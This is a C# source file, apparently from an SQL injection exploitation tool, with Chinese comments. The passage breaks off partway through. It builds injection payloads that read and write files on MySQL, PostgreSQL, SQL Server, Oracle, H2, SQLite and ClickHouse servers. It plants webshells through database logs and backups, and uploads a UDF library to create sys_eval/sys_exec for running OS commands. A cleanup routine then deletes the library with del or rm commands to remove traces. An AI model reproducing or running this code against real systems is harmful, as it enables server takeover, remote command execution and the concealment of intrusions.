using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Payload;
using SuperSQLInjectionV2.Tools;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.Tools.UdfTool;
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

namespace SuperSQLInjectionV2.ViewModels.Tools
{
    /// <summary>
    /// 文件读写与命令执行后端逻辑
    /// </summary>
    public class FileCmdTools
    {
        /// <summary>
        /// 直接发送一个payload（用于堆叠查询等场景）
        /// </summary>
        private static async Task<HttpResponse> SendPayload(AppConfig config, string payload)
        {
            HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
            request.Payload = payload;
            return await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
        }

        /// <summary>
        /// 输出操作结果长度；0字节时补充警告（目标可能不支持该方式/权限不足/文件不存在/命令无输出），
        /// 避免静默空结果让用户误以为成功（如Linux SQL Server无xp_cmdshell、金仓阉割COPY FROM PROGRAM等场景）
        /// </summary>
        private static void ShowResultLen(string prefix, int len, string suffix = "")
        {
            Log.Show(prefix + len + "字节！" + suffix);
            if (len <= 0)
            {
                Log.Warning("结果为0字节！可能原因：目标环境不支持该方式/权限不足/文件不存在或为空/命令无回显，请换其他方式或核实目标环境。");
            }
        }

        /// <summary>
        /// 堆叠通道自动切换：操作需要堆叠注入而当前注入类型非堆叠时，查注入通道注册表（检测记录）
        /// 中同目标同参数是否登记过堆叠记录；有则自动切换注入类型为堆叠（带出时间盲注oracle所需的
        /// BoolInjectType/CheckValue/Revers），并日志告知用户；无则返回false，调用方走原有告警逻辑
        /// </summary>
        private static bool TryAutoSwitchStacked(AppConfig config, string opDesc)
        {
            var dc = config.DataConfig;
            if (dc.SelectedInjectType.Equals(InjectType.Stacked))
            {
                return true;
            }
            InjectRecord? rec = InjectChannelRegistry.FindByType(config.Host, config.Port, dc.InjectParamName, InjectType.Stacked);
            if (rec == null)
            {
                return false;
            }
            InjectType oldType = dc.SelectedInjectType;
            dc.SelectedInjectType = InjectType.Stacked;
            dc.SelectBoolInject = rec.BoolInjectType;
            dc.CheckValue = rec.CheckValue ?? "";
            dc.Reverse = rec.Revers;
            Log.Success(opDesc + "需要堆叠注入：注入记录中同参数存在堆叠通道，已自动切换注入类型（" + oldType + "→堆叠）！");
            return true;
        }

        /// <summary>
        /// 执行文件操作
        /// </summary>
        public static async Task ExecuteFile(AppConfig config, FileCmdViewModel vm)
        {
            if (!MainViewViewModel.EnsureDataOpReady(config))
            {
                return;
            }
            try
            {
                string method = vm.SelectedFileMethod;
                switch (method)
                {
                    case "Load_File读文件":
                        await ReadFileByMySQL(config, vm).ConfigureAwait(false);
                        break;
                    case "Union写文件":
                        await WriteFileByMySQL(config, vm).ConfigureAwait(false);
                        break;
                    case "Copy读文件":
                        await ReadFileByPostgreSQL(config, vm).ConfigureAwait(false);
                        break;
                    case "Copy写文件":
                        await WriteFileByPostgreSQL(config, vm).ConfigureAwait(false);
                        break;
                    case "FileSystemObject读文件":
                        await ReadFileBySQLServer(config, vm, PayloadFactory.BasePayload.Get("FileReadFso")).ConfigureAwait(false);
                        break;
                    case "BULK INSERT读文件":
                        await ReadFileBySQLServer(config, vm, PayloadFactory.BasePayload.Get("FileReadBulk")).ConfigureAwait(false);
                        break;
                    case "FileSystemObject写文件":
                        await WriteFileBySQLServer(config, vm, PayloadFactory.BasePayload.Get("FileWriteFso")).ConfigureAwait(false);
                        break;
                    case "Sp_MakeWebTask写文件":
                        await WriteFileBySQLServer(config, vm, PayloadFactory.BasePayload.Get("FileWriteWebTask")).ConfigureAwait(false);
                        break;
                    case "备份写WebShell(有多余数据)":
                        await WriteFileBySQLServerBackUp(config, vm).ConfigureAwait(false);
                        break;
                    case "CSVREAD读文件":
                        await ReadFileByH2(config, vm).ConfigureAwait(false);
                        break;
                    case "CSVWRITE写文件":
                        await WriteFileByH2(config, vm).ConfigureAwait(false);
                        break;
                    case "日志写WebShell":
                        await WriteFileByMySqlLog(config, vm).ConfigureAwait(false);
                        break;
                    case "大对象读文件":
                        await ReadFileByPgLargeObject(config, vm).ConfigureAwait(false);
                        break;
                    case "大对象写文件":
                        await WriteFileByPgLargeObject(config, vm).ConfigureAwait(false);
                        break;
                    case "ATTACH写WebShell":
                        await WriteFileBySqlite(config, vm).ConfigureAwait(false);
                        break;
                    case "file()读文件":
                        await ReadFileByClickHouse(config, vm).ConfigureAwait(false);
                        break;
                    case "Java读文件":
                        await ReadFileByOracleJava(config, vm).ConfigureAwait(false);
                        break;
                    case "Java写文件":
                        await WriteFileByOracleJava(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制下载(load_file)":
                        await BinaryDownloadMySQL(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制上传(dumpfile)":
                        await BinaryUploadMySQL(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制下载(大对象)":
                        await BinaryDownloadPg(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制上传(大对象)":
                        await BinaryUploadPg(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制下载(OPENROWSET)":
                        await BinaryDownloadSqlServer(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制上传(ADODB.Stream)":
                        await BinaryUploadSqlServer(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制下载(Java)":
                        await BinaryDownloadOracle(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制上传(Java)":
                        await BinaryUploadOracle(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制下载(file RawBLOB)":
                        await BinaryDownloadClickHouse(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制下载(FILE_READ)":
                        await BinaryDownloadH2(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制上传(FILE_WRITE)":
                        await BinaryUploadH2(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制下载(readfile扩展)":
                        await BinaryDownloadSqlite(config, vm).ConfigureAwait(false);
                        break;
                    case "二进制上传(writefile扩展)":
                        await BinaryUploadSqlite(config, vm).ConfigureAwait(false);
                        break;
                }
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止文件操作！");
            }
            catch (Exception e)
            {
                Log.Show("文件操作发生异常：" + e.Message);
            }
        }

        /// <summary>
        /// MySQL Load_File读文件
        /// </summary>
        private static async Task ReadFileByMySQL(AppConfig config, FileCmdViewModel vm)
        {
            string pathHex = TextCodec.StrToHex(vm.FilePath, "UTF-8");
            string dataPayload = TemplateRenderer.Render(PayloadFactory.BasePayload.Hex, ("expr", "load_file(" + pathHex + ")"));
            string result = "";
            switch (config.DataConfig.SelectedInjectType)
            {
                case InjectType.Blind:
                case InjectType.Time:
                case InjectType.Stacked:
                case InjectType.Dns:
                    //堆叠点读文件内容：回退时间盲注通道（load_file表达式逐字符取值）
                    if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                    {
                        Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                        return;
                    }
                    string hexData = (await DataComm.GetStringByBool(config, dataPayload, 50000).ConfigureAwait(false)) ?? "";
                    result = TextCodec.unHex(hexData, vm.FileEncoding);
                    break;
                case InjectType.Union:
                    result = await DataComm.DataDumpWithNoFrom(config, "(convert(load_file(" + pathHex + ") using UTF8))").ConfigureAwait(false);
                    break;
                case InjectType.Error:
                    string lenStr = await DataComm.DataDumpWithError(config, PayloadFactory.BPTool.DataLen(dataPayload)).ConfigureAwait(false);
                    int sumlen = 0;
                    int.TryParse(lenStr, out sumlen);
                    Log.SysLog("文件hex数据长度：" + sumlen);
                    //报错分片步长：实测回显容量优先（探针二分测得并缓存到注入记录），回退模板ErrorChunkLen
                    int step = await DataComm.GetErrorChunkStep(config).ConfigureAwait(false);
                    StringBuilder sb = new StringBuilder();
                    for (int s = 1; s <= sumlen; s += step)
                    {
                        config.CheckStop();
                        sb.Append(await DataComm.DataDump(config, PayloadFactory.BPTool.ErrorDataSubstr(dataPayload, s, step)).ConfigureAwait(false));
                    }
                    result = TextCodec.unHex(sb.ToString(), vm.FileEncoding);
                    break;
            }
            vm.SetFileContent(result);
            ShowResultLen("读文件完成，内容长度：", result.Length);
        }

        /// <summary>
        /// MySQL Union方式写文件
        /// </summary>
        private static async Task WriteFileByMySQL(AppConfig config, FileCmdViewModel vm)
        {
            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked))
            {
                //堆叠写文件：不依赖Union显示位，直接堆叠 select ... into dumpfile
                string hex = TextCodec.StrToHex(vm.FileContent, "UTF-8");
                string stackedPayload = " 1=1;select " + hex + " into dumpfile '" + vm.FilePath.Replace("\\", "/", StringComparison.Ordinal).Replace("'", "''", StringComparison.Ordinal)
                    + "';select 1 where 1=1 ";
                await SendPayload(config, stackedPayload).ConfigureAwait(false);
                await VerifyMySqlWrite(config, vm.FilePath, Encoding.UTF8.GetByteCount(vm.FileContent)).ConfigureAwait(false);
                return;
            }
            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Union))
            {
                //非Union/堆叠：注入记录中有堆叠通道时自动切换到堆叠后走堆叠写文件
                if (TryAutoSwitchStacked(config, "写文件"))
                {
                    await WriteFileByMySQL(config, vm).ConfigureAwait(false);
                    return;
                }
                Log.Warning("大侠此种方式写文件，只支持Union/堆叠注入！");
                return;
            }
            int columnsLen = config.DataConfig.SumColumnCount;
            int showIndex = config.DataConfig.ShowColumnIndex;
            //1=2压制原始行（防止原表行混入文件内容）；INTO DUMPFILE直接拼接各列字节，
            //非显示位必须用x''空二进制字面量填充——MySQL 8实测NULL会被写成0x00字节污染文件内容，x''/'' 零字节产出（x''对int列也安全）
            StringBuilder sb = new StringBuilder(" 1=2 union select ");
            for (int i = 1; i <= columnsLen; i++)
            {
                if (i == showIndex)
                {
                    sb.Append(TextCodec.StrToHex(vm.FileContent, "UTF-8") + ",");
                }
                else
                {
                    sb.Append("x'',");
                }
            }
            sb.Remove(sb.Length - 1, 1);
            sb.Append(" into dumpfile '" + vm.FilePath + "'");
            await SendPayload(config, sb.ToString()).ConfigureAwait(false);
            await VerifyMySqlWrite(config, vm.FilePath, Encoding.UTF8.GetByteCount(vm.FileContent)).ConfigureAwait(false);
        }

        /// <summary>MySQL写后读回验证：length(load_file)比对字节数，输出明确的成功/告警日志（文本/二进制写文件共用）</summary>
        private static async Task VerifyMySqlWrite(AppConfig config, string path, int expectedBytes)
        {
            string pathHex = TextCodec.StrToHex(path, "UTF-8");
            string lenStr = await FetchScalar(config, "(select length(load_file(" + pathHex + ")))").ConfigureAwait(false);
            if (int.TryParse(lenStr, out int remoteLen) && remoteLen == expectedBytes)
            {
                Log.Success("写文件验证通过：远端文件 " + remoteLen + " 字节，与预期一致！");
            }
            else
            {
                Log.Warning("写文件验证未通过（远端长度=" + (lenStr ?? "读取失败") + "，预期=" + expectedBytes + "）！可能原因：secure_file_priv限制/目录不可写/权限不足，请人工检查。");
            }
        }

        /// <summary>PostgreSQL 文件操作模板取值并替换 {path}/{content} 槽位（模板来自 config/payload/postgresql.txt）</summary>
        private static string PGTPL(string key, string value)
        {
            return PayloadFactory.BasePayload.Get(key).Replace("{path}", value, StringComparison.Ordinal).Replace("{content}", value, StringComparison.Ordinal);
        }

        /// <summary>
        /// PostgreSQL Copy读文件
        /// </summary>
        private static async Task ReadFileByPostgreSQL(AppConfig config, FileCmdViewModel vm)
        {
            await SendPayload(config, PGTPL("FileReadCopy", vm.FilePath)).ConfigureAwait(false);            try
            {
                StringBuilder result = new StringBuilder();
                switch (config.DataConfig.SelectedInjectType)
                {
                    case InjectType.Blind:
                    case InjectType.Time:
                    case InjectType.Stacked:
                    case InjectType.Dns:
                        if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                        {
                            Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                            return;
                        }
                        int count = await DataComm.GetBoolValue(config, PayloadFactory.BasePayload.Get("FileContentCount"), 0, 100000).ConfigureAwait(false);
                        Log.SysLog("读到文件内容，共有" + count + "行数据！");
                        for (int i = 0; i < count; i++)
                        {
                            config.CheckStop();
                            string dataPayload = PayloadFactory.BasePayload.Get("FileContentData").Replace("{index}", i + "", StringComparison.Ordinal);
                            string row = (await DataComm.GetStringByBool(config, dataPayload, 100000).ConfigureAwait(false)) ?? "";
                            result.AppendLine(row);
                            vm.SetFileContent(result.ToString());
                        }
                        break;
                    case InjectType.Union:
                        string countStr = await DataComm.DataDumpWithNoFrom(config, PayloadFactory.BasePayload.Get("FileContentCount")).ConfigureAwait(false);
                        int ucount = 0;
                        int.TryParse(countStr, out ucount);
                        Log.SysLog("读到文件内容，共有" + ucount + "行数据！");
                        for (int i = 0; i < ucount; i++)
                        {
                            config.CheckStop();
                            string dataPayload = PayloadFactory.BasePayload.Get("FileContentData").Replace("{index}", i + "", StringComparison.Ordinal);
                            result.AppendLine(await DataComm.DataDumpWithNoFrom(config, dataPayload).ConfigureAwait(false));
                            vm.SetFileContent(result.ToString());
                        }
                        break;
                    case InjectType.Error:
                        string ecountStr = await DataComm.DataDumpWithError(config, PayloadFactory.BasePayload.Get("FileContentCount")).ConfigureAwait(false);
                        int ecount = 0;
                        int.TryParse(ecountStr, out ecount);
                        Log.SysLog("读到文件内容，共有" + ecount + "行数据！");
                        for (int i = 0; i < ecount; i++)
                        {
                            config.CheckStop();
                            string dataPayload = PayloadFactory.BasePayload.Get("FileContentData").Replace("{index}", i + "", StringComparison.Ordinal);
                            result.AppendLine(await DataComm.DataDumpWithError(config, dataPayload).ConfigureAwait(false));
                            vm.SetFileContent(result.ToString());
                        }
                        break;
                }
                Log.Show("读文件完成！");
            }
            finally
            {
                //删除临时表
                try
                {
                    await SendPayload(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
        }

        /// <summary>
        /// PostgreSQL Copy写文件
        /// </summary>
        private static async Task WriteFileByPostgreSQL(AppConfig config, FileCmdViewModel vm)
        {
            //创建临时表
            await SendPayload(config, PayloadFactory.BasePayload.Get("CmdCreateTable")).ConfigureAwait(false);
            string[] lines = vm.FileContent.Replace("\r\n", "\n", StringComparison.Ordinal).Split('\n');
            foreach (string line in lines)
            {
                config.CheckStop();
                if (!string.IsNullOrEmpty(line))
                {
                    await SendPayload(config, PGTPL("FileInsertLine", line.Replace("'", "''", StringComparison.Ordinal))).ConfigureAwait(false);
                }
            }
            await SendPayload(config, PGTPL("FileWriteCopy", vm.FilePath)).ConfigureAwait(false);
            //写后读回验证：pg_stat_file取文件体积（与COPY TO同属服务端文件权限族，存在且非空即成功；COPY逐行写出体积与原文有差异不精确比对）
            string sizeStr = await FetchScalar(config, "(select coalesce((pg_stat_file('" + vm.FilePath.Replace("'", "''", StringComparison.Ordinal) + "',true)).size,0))").ConfigureAwait(false);
            if (long.TryParse(sizeStr, out long fsize) && fsize > 0)
            {
                Log.Success("写文件验证通过：远端文件存在，体积 " + fsize + " 字节！");
            }
            else
            {
                Log.Warning("写文件验证未通过（远端读取=" + (sizeStr ?? "失败") + "）！可能原因：非superuser/无pg_write_server_files角色/目录不可写，请人工检查。");
            }
        }

        /// <summary>
        /// SQLServer读文件（FileSystemObject走sp_oacreate仅Windows可用；BULK INSERT跨平台）
        /// </summary>
        private static async Task ReadFileBySQLServer(AppConfig config, FileCmdViewModel vm, string readPayload)
        {
            await SendPayload(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
            await SendPayload(config, readPayload.Replace("{path}", vm.FilePath, StringComparison.Ordinal)).ConfigureAwait(false);
            try
            {
                string result = "";
                switch (config.DataConfig.SelectedInjectType)
                {
                    case InjectType.Blind:
                    case InjectType.Time:
                    case InjectType.Stacked:
                    case InjectType.Dns:
                        if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                        {
                            Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                            return;
                        }
                        //按Unicode值逐字符获取，支持中文等多字节字符
                        result = (await DataComm.GetStringByBool(config, PayloadFactory.BasePayload.Get("FileContent"), 1024 * 100).ConfigureAwait(false)) ?? "";
                        break;
                    case InjectType.Union:
                        result = await DataComm.DataDumpWithNoFrom(config, PayloadFactory.BasePayload.Get("FileContent")).ConfigureAwait(false);
                        break;
                    case InjectType.Error:
                        result = await DataComm.DataDumpWithError(config, PayloadFactory.BasePayload.Get("FileContent")).ConfigureAwait(false);
                        break;
                }
                vm.SetFileContent(result);
                ShowResultLen("读文件完成，内容长度：", result.Length);
            }
            finally
            {
                try
                {
                    await SendPayload(config, PayloadFactory.BasePayload.Get("CmdDropTable")).ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
        }

        /// <summary>
        /// SQLServer写文件（FileSystemObject/Sp_MakeWebTask）
        /// </summary>
        private static async Task WriteFileBySQLServer(AppConfig config, FileCmdViewModel vm, string writePayload)
        {
            string payload = writePayload
                .Replace("{path}", TextCodec.StrToHex(vm.FilePath, "GB2312"), StringComparison.Ordinal)
                .Replace("{data}", TextCodec.StrToHex(vm.FileContent, "GB2312"), StringComparison.Ordinal);
            if (config.DataConfig.IsTimeChannel)
            {
                payload = payload.Replace(" 1=1;", ";", StringComparison.Ordinal);
            }
            await SendPayload(config, payload).ConfigureAwait(false);
            await VerifySqlServerWrite(config, vm).ConfigureAwait(false);
        }

        /// <summary>
        /// SQLServer写后验证：先经xp_fileexist确认文件存在（二进制备份格式也能判），
        /// 存在时再尝试BULK INSERT回读做内容片段比对；不存在则明确报写入失败，
        /// 避免sp_makewebtask已被新版移除/目标路径无权限等静默失败时误报成功
        /// </summary>
        private static async Task VerifySqlServerWrite(AppConfig config, FileCmdViewModel vm)
        {
            try
            {
                string existPayload = PayloadFactory.BasePayload.Get("FileExistCheck").Replace("{path}", vm.FilePath, StringComparison.Ordinal);
                string exists = (await ReadSqlServerScalar(config, existPayload, PayloadFactory.BasePayload.Get("FileExistResult")).ConfigureAwait(false))?.Trim() ?? "";
                if (!"1".Equals(exists, StringComparison.Ordinal))
                {
                    Log.Warning("写入验证失败：目标文件不存在（xp_fileexist确认）！新版SQLServer已移除sp_makewebtask、服务账号对目标路径无写权限时均会失败。");
                    return;
                }
                //文件已存在：尝试回读内容片段比对（备份写等二进制格式回读不出原文属正常，按存在即成功）
                string content = vm.FileContent ?? "";
                string probe = content.Length > 16 ? content.Substring(0, 16) : content;
                string back = await ReadSqlServerFileText(config, vm.FilePath).ConfigureAwait(false);
                if (!string.IsNullOrEmpty(back) && !string.IsNullOrEmpty(probe) && back.Contains(probe, StringComparison.Ordinal))
                {
                    Log.Show("写入验证通过：文件已写入且回读内容一致（回读长度" + back.Length + "字节）");
                    return;
                }
                Log.Show("写入验证通过：文件已确认存在（xp_fileexist）；内容为二进制/备份格式未做逐字节比对，请按需人工抽查。");
            }
            catch (Exception e)
            {
                Log.Warning("写入验证异常：" + e.Message + "，请人工检查目标文件。");
            }
        }

        /// <summary>
        /// SQLServer备份方式写WebShell
        /// </summary>
        private static async Task WriteFileBySQLServerBackUp(AppConfig config, FileCmdViewModel vm)
        {
            string payload = PayloadFactory.BasePayload.Get("FileWriteBackup")
                .Replace("{path}", TextCodec.StrToHex(vm.FilePath, "GB2312"), StringComparison.Ordinal)
                .Replace("{data}", TextCodec.StrToHex(vm.FileContent, "GB2312"), StringComparison.Ordinal);
            string dropWriteFileBackUpTableAndDropDB = PayloadFactory.BasePayload.Get("FileBackupDrop");
            string createWriteFileBackUpDB = PayloadFactory.BasePayload.Get("FileBackupCreateDb");
            string createWriteFileBackUpTable = PayloadFactory.BasePayload.Get("FileBackupCreateTable");
            if (config.DataConfig.IsTimeChannel)
            {
                payload = payload.Replace(" 1=1;", ";", StringComparison.Ordinal);
                dropWriteFileBackUpTableAndDropDB = dropWriteFileBackUpTableAndDropDB.Replace(" 1=1;", ";", StringComparison.Ordinal);
                createWriteFileBackUpDB = createWriteFileBackUpDB.Replace(" 1=1;", ";", StringComparison.Ordinal);
                createWriteFileBackUpTable = createWriteFileBackUpTable.Replace(" 1=1;", ";", StringComparison.Ordinal);
            }
            //删库删表
            await SendPayload(config, dropWriteFileBackUpTableAndDropDB).ConfigureAwait(false);
            //建库建表
            await SendPayload(config, createWriteFileBackUpDB).ConfigureAwait(false);
            await SendPayload(config, createWriteFileBackUpTable).ConfigureAwait(false);
            //执行备份写
            await SendPayload(config, payload).ConfigureAwait(false);
            //删库删表
            await SendPayload(config, dropWriteFileBackUpTableAndDropDB).ConfigureAwait(false);
            await VerifySqlServerWrite(config, vm).ConfigureAwait(false);
        }

        /// <summary>
        /// 命令执行入口：按数据库类型分发（SQLServer走xp_cmdshell，PostgreSQL走COPY FROM PROGRAM，MySQL走UDF sys_eval）
        /// </summary>
        public static async Task ExecuteCmd(AppConfig config, FileCmdViewModel vm)
        {
            if (!MainViewViewModel.EnsureDataOpReady(config))
            {
                return;
            }
            if (config.DataConfig.SelectedDBType.Equals(DBType.Oracle))
            {
                await ExecuteCmdOracle(config, vm).ConfigureAwait(false);
                return;
            }
            if (config.DataConfig.SelectedDBType.Equals(DBType.H2))
            {
                await ExecuteCmdH2(config, vm).ConfigureAwait(false);
                return;
            }
            if (config.DataConfig.SelectedDBType.Equals(DBType.PostgreSQL))
            {
                await ExecuteCmdPostgreSQL(config, vm).ConfigureAwait(false);
                return;
            }
            if (config.DataConfig.SelectedDBType.Equals(DBType.Kingbase))
            {
                //KingbaseES兼容PG语法：仅COPY FROM PROGRAM（UDF二进制为PG专用，不接）
                await ExecuteCmdPostgreSqlCopy(config, vm).ConfigureAwait(false);
                return;
            }
            if (config.DataConfig.SelectedDBType.Equals(DBType.MySQL))
            {
                await ExecuteCmdMySQL(config, vm).ConfigureAwait(false);
                return;
            }
            await ExecuteCmdSQLServer(config, vm).ConfigureAwait(false);
        }

        /// <summary>
        /// 已完成UDF安装的目标标识（避免每次命令重复上传库文件）
        /// </summary>
        private static string? _udfReadyKey = null;

        /// <summary>已安装UDF库文件的目标路径（清理痕迹时删除用，Provision成功后记录）</summary>
        private static string? _udfInstalledPath = null;

        /// <summary>已安装UDF目标是否Windows平台（清理时选择del/rm命令）</summary>
        private static bool _udfInstalledIsWindows = false;

        /// <summary>
        /// 按当前注入类型取一个标量值（Union/报错直接回显，盲注逐字符）
        /// </summary>
        private static async Task<string> FetchScalar(AppConfig config, string payload)
        {
            switch (config.DataConfig.SelectedInjectType)
            {
                case InjectType.Union:
                    return await DataComm.DataDumpWithNoFrom(config, payload).ConfigureAwait(false);
                case InjectType.Error:
                    return await DataComm.DataDumpWithError(config, payload).ConfigureAwait(false);
                case InjectType.Blind:
                case InjectType.Time:
                case InjectType.Stacked:
                case InjectType.Dns:
                    //快通道优先：同参数有可用Union/Error记录时一次请求取值（写后验证/UDF探测等免于逐字符盲注）
                    string? upgraded = await DataComm.TryUpgradeFetch(config, payload, 4096).ConfigureAwait(false);
                    if (upgraded != null)
                    {
                        return upgraded;
                    }
                    if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                    {
                        Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                        return "";
                    }
                    return (await DataComm.GetStringByBool(config, payload, 4096).ConfigureAwait(false)) ?? "";
                default:
                    return "";
            }
        }

        /// <summary>
        /// MySQL UDF（lib_mysqludf_sys）安装：获取plugin目录与平台信息→选择对应二进制→Union写入dumpfile→堆叠创建sys_eval/sys_exec函数
        /// </summary>
        private static async Task ProvisionMySqlUdf(AppConfig config)
        {
            bool isStacked = config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked);
            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Union) && !isStacked)
            {
                //注入记录中有堆叠通道时自动切换（UDF写库+create function全堆叠链路更简洁）
                if (TryAutoSwitchStacked(config, "MySQL UDF命令执行"))
                {
                    isStacked = true;
                }
                else
                {
                    throw new Exception("MySQL UDF命令执行需要Union或堆叠注入（需要将UDF库文件写入plugin目录）！");
                }
            }
            if (!MySqlUdfSupport.IsAvailable())
            {
                throw new Exception("UDF库文件缺失：config/udf/mysql/！");
            }
            Log.Show("正在获取目标MySQL的plugin目录与平台信息……");
            string pluginDir = await FetchScalar(config, "(select @@plugin_dir)").ConfigureAwait(false);
            string compileOs = await FetchScalar(config, "(select @@version_compile_os)").ConfigureAwait(false);
            string machine = await FetchScalar(config, "(select @@version_compile_machine)").ConfigureAwait(false);
            if (string.IsNullOrEmpty(pluginDir))
            {
                throw new Exception("未能获取@@plugin_dir（MySQL需5.1+），无法写入UDF库！");
            }
            Log.Show("plugin目录：" + pluginDir + "，平台：" + compileOs + "/" + machine);
            byte[] udf = MySqlUdfSupport.LoadUdfBinary(compileOs, machine, out string libExt);
            string libName = "sqlib" + MyTools.RandStr(4).ToLower ()+ libExt;
            if (!pluginDir.EndsWith('/') && !pluginDir.EndsWith('\\'))
            {
                pluginDir += "/";
            }
            //Union写入UDF库：1=2压制原始行（防止多余行污染二进制），
            //非显示位必须用NULL填充（INTO DUMPFILE直接拼接各列字节，填充值会污染文件内容），
            //路径必须是引号字符串（hex字面量会被MySQL当作变量解析），Windows下统一用正斜杠
            string targetPath = (pluginDir + libName).Replace("\\", "/", StringComparison.Ordinal).Replace("'", "''", StringComparison.Ordinal);
            string udfHex = "0x" + Convert.ToHexString(udf);
            if (isStacked)
            {
                //堆叠写入UDF库：不依赖Union显示位/列数，整段二进制一语句落盘
                Log.Show("正在以堆叠方式写入UDF库文件（" + udf.Length + "字节）到plugin目录……注意：GET方式可能因URL长度受限！");
                await SendPayload(config, " 1=1;select " + udfHex + " into dumpfile '" + targetPath + "';select 1 where 1=1 ").ConfigureAwait(false);
            }
            else
            {
            int columnsLen = config.DataConfig.SumColumnCount;
            int showIndex = config.DataConfig.ShowColumnIndex;
            StringBuilder sb = new StringBuilder(" 1=2 union select ");
            for (int i = 1; i <= columnsLen; i++)
            {
                sb.Append(i == showIndex ? udfHex : "x''");
                sb.Append(',');
            }
            sb.Remove(sb.Length - 1, 1);
            sb.Append(" into dumpfile '" + targetPath + "'");
            Log.Show("正在写入UDF库文件（" + udf.Length + "字节）到plugin目录……注意：GET方式可能因URL长度受限！");
            await SendPayload(config, sb.ToString()).ConfigureAwait(false);
            }
            //堆叠创建函数（soname同样必须是引号字符串）；必须await——
            //不等待会在函数未创建完成时就发sys_eval取值请求，且异常被静默吞掉无法告警
            Log.Show("正在创建sys_eval/sys_exec函数（需要堆叠查询支持）……");
            await SendPayload(config, " 1=1;drop function if exists sys_eval;drop function if exists sys_exec;"
                + "create function sys_eval returns string soname '" + libName + "';"
                + "create function sys_exec returns int soname '" + libName + "';select 1 where 1=1 ").ConfigureAwait(false);
            //记录安装痕迹（库文件路径/平台），供--cleanup式清理使用
            _udfInstalledPath = targetPath;
            _udfInstalledIsWindows = (compileOs ?? "").Contains("win", StringComparison.OrdinalIgnoreCase);
            Log.Show("UDF安装流程完成！如命令执行无结果请检查：1.目标是否支持堆叠查询 2.账号是否有mysql库写权限 3.库文件是否写入成功（secure_file_priv需为空或包含plugin目录）");
        }

        /// <summary>
        /// UDF痕迹清理（cleanup 能力）：先借sys_eval自身删除plugin目录下的UDF库文件，
        /// 再drop sys_eval/sys_exec函数，最后复位安装状态。仅MySQL UDF通道适用
        /// </summary>
        public static async Task CleanupMySqlUdf(AppConfig config)
        {
            if (!config.DataConfig.SelectedDBType.Equals(DBType.MySQL))
            {
                Log.Warning("UDF清理仅适用于MySQL UDF命令执行通道！");
                return;
            }
            //1.删除UDF库文件（函数还在，借sys_eval执行系统删除命令；文件被MySQL进程占用时删除可能失败，仅尽力而为）
            if (!string.IsNullOrEmpty(_udfInstalledPath))
            {
                string delCmd = _udfInstalledIsWindows
                    ? "cmd /c del /f /q \"" + _udfInstalledPath.Replace("/", "\\", StringComparison.Ordinal) + "\""
                    : "rm -f '" + _udfInstalledPath + "'";
                string cmdHex = Convert.ToHexString(Encoding.UTF8.GetBytes(delCmd));
                Log.Show("正在删除UDF库文件：" + _udfInstalledPath);
                try
                {
                    await FetchScalar(config, "(select cast(sys_eval(0x" + cmdHex + ") as char(500)))").ConfigureAwait(false);
                }
                catch (Exception e)
                {
                    Log.Warning("删除UDF库文件时异常（可能已被占用或函数不存在）：" + e.Message);
                }
            }
            else
            {
                Log.Show("未记录到本次会话安装的UDF库文件路径，跳过文件删除（仅清理函数）！");
            }
            //2.drop函数（需要堆叠查询支持）
            Log.Show("正在删除sys_eval/sys_exec函数……");
            await SendPayload(config, " 1=1;drop function if exists sys_eval;drop function if exists sys_exec;select 1 where 1=1 ").ConfigureAwait(false);
            //3.复位安装状态
            _udfReadyKey = null;
            _udfInstalledPath = null;
            _udfInstalledIsWindows = false;
            Log.Success("UDF痕迹清理完成：函数已drop，库文件已尽力删除。请人工确认plugin目录无残留的sqlib*文件！");
        }

        //==================== PostgreSQL UDF（lib_postgresqludf_sys，对标业界同类工具 PG takeover，需堆叠通道）====================

        /// <summary>PG UDF 已安装目标标识</summary>
        private static string? _pgUdfReadyKey = null;

        /// <summary>PG UDF 库文件目标路径（清理用）</summary>
        private static string? _pgUdfInstalledPath = null;

        /// <summary>PG UDF 目标是否 Windows 平台（清理时选择del/rm命令）</summary>
        private static bool _pgUdfInstalledIsWindows = false;

        /// <summary>堆叠通道发一条SQL语句（PG UDF部署用）</summary>
        private static async Task SendStackedStmt(AppConfig config, string stmt)
        {
            await SendPayload(config, " 1=1;" + stmt + ";select 1 where 1=1 ").ConfigureAwait(false);
        }

        /// <summary>
        /// PG UDF 安装：version 解析版本/平台 → 大对象分页写入 → lo_export 落盘 → CREATE FUNCTION sys_eval/sys_exec。
        /// 部署语句始终以堆叠形式发送（要求注入点本身支持堆叠查询），版本探测取值走当前通道（Union/报错快，盲注慢）；
